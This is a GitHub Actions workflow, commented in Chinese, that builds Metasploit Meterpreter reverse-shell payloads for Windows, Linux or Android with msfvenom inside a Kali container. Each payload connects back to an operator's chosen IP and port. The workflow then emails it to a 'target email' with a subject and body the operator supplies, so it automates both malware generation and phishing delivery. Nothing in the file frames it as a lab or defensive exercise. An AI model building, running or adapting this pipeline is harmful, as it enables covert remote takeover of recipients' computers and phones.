name: Generate Metasploit Payload

on:
  workflow_dispatch:
    inputs:
      platform:
        description: '选择目标平台'
        required: true
        default: 'windows'
        type: choice
        options:
          - windows
          - linux
          - android
      lhost:
        description: '输入你的公网IP或内网IP'
        required: true
        default: '192.168.1.100'
      lport:
        description: '输入监听端口'
        required: true
        default: '4444'
      email:
        description: '输入目标邮箱'
        required: true
      subject:
        description: '输入邮件标题'
        required: true
      body:
        description: '输入正文'
        required: true
      

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Generate Payload using Kali Docker
        run: |
          sudo apt-get update
          sudo apt-get install zip unzip -y
          docker pull kalilinux/kali-rolling
          
          # 根据用户选择的平台，设置 msfvenom 参数
          case "${{ github.event.inputs.platform }}" in
            "windows")
              PAYLOAD="windows/x64/meterpreter/reverse_tcp"
              EXT="exe"
              FORMAT_FLAG="-f exe"
              PLATFORM="" # 留空，windows不需要额外平台参数
              ;;
            "android")
              PAYLOAD="android/meterpreter/reverse_tcp"
              EXT="apk"
              FORMAT_FLAG="AndroidWakelock=true StageEncoder=aes/base64 AndroidUncrypt=true" # apk格式不需要-f参数
              PLATFORM="--platform android"
              ;;
            "linux")
              PAYLOAD="linux/x64/meterpreter/reverse_tcp"
              EXT="elf"
              FORMAT_FLAG="-f elf"
              PLATFORM=""
              ;;
            *)
              echo "不支持的平台"
              exit 1
              ;;
          esac

          # 生成文件名并保存到环境变量（在容器外部执行）
          ENAME=$(cat /proc/sys/kernel/random/uuid)
          FNAME=$(cat /proc/sys/kernel/random/uuid)
          echo "FILENAME=$ENAME" >> $GITHUB_ENV
          echo "EFROM=$FNAME" >> $GITHUB_ENV
          echo "EXT=$EXT" >> $GITHUB_ENV
          OUTPUT_FILE="/output/${ENAME}.${EXT}"

          echo "正在生成载荷: $PAYLOAD"
          echo "输出文件: $OUTPUT_FILE"

          # 运行容器并生成 Payload
          docker run --rm \
            -v "${PWD}:/output" \
            -u root \
            kalilinux/kali-rolling \
            bash -c "apt-get update && \
                     apt-get install -y metasploit-framework && \
                     msfvenom $PLATFORM $FORMAT_FLAG -p $PAYLOAD LHOST=${{ github.event.inputs.lhost }} LPORT=${{ github.event.inputs.lport }} -o '$OUTPUT_FILE'"
          if [ "${EXT}" = "exe" ]; then
            zip ${ENAME}.zip ${ENAME}.exe
            echo "EXT=zip" >> $GITHUB_ENV
          fi
            
      - name: Send email
        uses: dawidd6/action-send-mail@v11
        with:
          server_address: smtp.yandex.com
          server_port: 465
          secure: true
          username: ${{ secrets.EMAIL_USERNAME }}
          password: ${{ secrets.EMAIL_PASSWORD }}
          subject: '${{ github.event.inputs.subject }}'
          to: '${{ github.event.inputs.email }}'
          from: ${{ env.EFROM }}
          # 可选，文本内容
          body: "${{ github.event.inputs.body }}"
          attachments: ${{ env.FILENAME }}.${{ env.EXT }}
            
      - name: Upload Payload
        uses: actions/upload-artifact@v4
        with:
          name: Generated-Payload
          # 拼接路径和文件名
          path: ${{ env.FILENAME }}.${{ env.EXT }}